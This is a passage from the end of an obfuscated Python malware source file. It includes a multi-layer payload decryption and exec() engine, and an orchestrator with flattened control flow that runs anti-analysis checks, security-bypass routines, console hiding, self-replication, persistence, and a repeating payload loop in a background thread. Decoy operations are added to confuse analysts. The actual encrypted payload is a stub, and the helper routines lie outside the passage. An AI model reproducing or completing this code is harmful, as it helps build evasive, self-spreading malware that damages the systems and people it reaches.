        except:
            pass

__pe__ = __PE__()

# Layer 10: Payload decryption and execution engine
class __PDE__:
    def __init__(self):
        self.__payload = None

    def __d(self, data, key):
        # Multi-layer decryption
        try:
            # Layer 1: XOR
            _x = bytearray()
            for i, c in enumerate(data):
                _x.append(c ^ key[i % len(key)])

            # Layer 2: Base64 decode
            _b = __b64__.b64decode(bytes(_x))

            # Layer 3: AES decrypt (simulated with simple XOR for demo)
            _k = __hsh__.sha256(key).digest()
            _a = bytearray()
            for i, c in enumerate(_b):
                _a.append(c ^ _k[i % len(_k)])

            # Layer 4: Zlib decompress
            _z = __zlb__.decompress(bytes(_a))

            return _z.decode('utf-8')
        except:
            return None

    def __e(self, code):
        try:
            exec(code, {'__name__': '__main__'})
        except:
            pass

    def __r(self):
        # Placeholder for actual encrypted payload
        # In production, this would contain the real encrypted payload
        pass

__pde__ = __PDE__()

# Layer 11: Main execution orchestrator with control flow flattening
class __MEO__:
    def __init__(self):
        self.__state = 0
        self.__force = "FORCE"

    def __run(self):
        # State machine with flattened control flow
        while True:
            if self.__state == 0:
                # Initial check
                if __os__.environ.get(self.__force) == '1':
                    self.__state = 3
                else:
                    self.__state = 1

            elif self.__state == 1:
                # Anti-analysis
                if __aae__.__run():
                    self.__state = 2
                else:
                    return

            elif self.__state == 2:
                # Bypass security
                __abe__.__b()
                __abe__.__b2()
                __abe__.__b3()
                __ebe__.__b()
                __ebe__.__b2()
                __ebe__.__b3()
                self.__state = 3

            elif self.__state == 3:
                # Hide console
                __che__.__h()
                self.__state = 4

            elif self.__state == 4:
                # Replicate
                __re__.__r()
                self.__state = 5

            elif self.__state == 5:
                # Persist
                __pe__.__p()
                self.__state = 6

            elif self.__state == 6:
                # Execute payload
                __pde__.__r()
                self.__state = 7

            elif self.__state == 7:
                # Sleep and loop
                try:
                    __tm__.sleep(60)
                except:
                    pass
                self.__state = 6

            else:
                self.__state = 0

__meo__ = __MEO__()

# Entry point with additional obfuscation
def main():
    # Dummy operations to confuse analysis
    _d = []
    for _ in range(__rnd__.randint(5, 20)):
        _d.append(__rnd__.random())
    _d.sort()

    # Start main orchestrator in background thread
    __thr__.Thread(target=__meo__.__run, daemon=True).start()

    # Keep main thread alive with decoy operations
    while True:
        try:
            __tm__.sleep(__rnd__.randint(50, 70))
            # Decoy: random math operations
            _x = __rnd__.random() * __mth__.pi
            _y = __mth__.sin(_x) * __mth__.cos(_x)
        except:
            pass

if __name__ == '__main__':
    main()
